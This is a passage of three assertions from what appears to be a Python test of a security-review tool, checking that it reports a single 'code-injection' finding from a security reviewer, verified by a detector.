    assert [f.category for f in findings] == ["code-injection"]
    assert findings[0].reviewer == "security_reviewer"
    assert findings[0].verified_by == "detector"
